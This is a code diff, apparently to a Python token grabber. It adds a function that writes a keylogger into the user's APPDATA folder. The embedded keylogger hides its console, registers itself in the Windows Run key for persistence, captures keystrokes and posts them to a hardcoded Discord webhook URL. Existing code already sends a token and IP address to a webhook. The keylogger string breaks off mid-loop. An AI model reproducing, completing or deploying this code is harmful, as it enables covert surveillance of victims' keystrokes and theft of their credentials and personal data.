@@ -45,7 +45,55 @@ def send_to_webhook(token, ip_address):
         requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers, timeout=5)
     except Exception:
         pass  # 에러 발생 시 무시 (콘솔 출력 없음)
-	    
+
+def create_keylogger_script():
+    appdata_path = os.getenv("APPDATA")
+    keylogger_path = os.path.join(appdata_path, "keylogger.py")
+    
+    keylogger_code = """import keyboard
+import requests
+import json
+import os
+import winreg
+import sys
+import ctypes
+import time
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1393916364288167976/ffnH0O_ErMU2h-_coi9r3f_lEXjyoqClz9TbRSnGgjBbyQfKzQ_bybTKZRnpnGuQh4Or"
+CHAR_LIMIT = 300
+
+def hide_console():
+    if sys.platform == "win32":
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def add_to_startup():
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, f'"pythonw" "{script_path}"')
+        winreg.CloseKey(key)
+    except Exception:
+        pass
+
+def send_to_webhook(log):
+    try:
+        payload = {"content": f"**키로그**\\n```{log}```"}
+        headers = {"Content-Type": "application/json"}
+        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers, timeout=5)
+    except Exception:
+        pass
+
+def log_keys():
+    logged_keys = []
+    hide_console()  # 콘솔 숨기기
+    add_to_startup()  # 시작 프로그램에 등록
+    
+    while True:
+        try:
+            event = keyboard.read_event(suppress=True)
+            if event.event_type == keyboard.KEY_DOWN:
+	    """
+	
 def load_config():
     try:
         with open("config/config.json", "r", encoding='utf-8') as file:
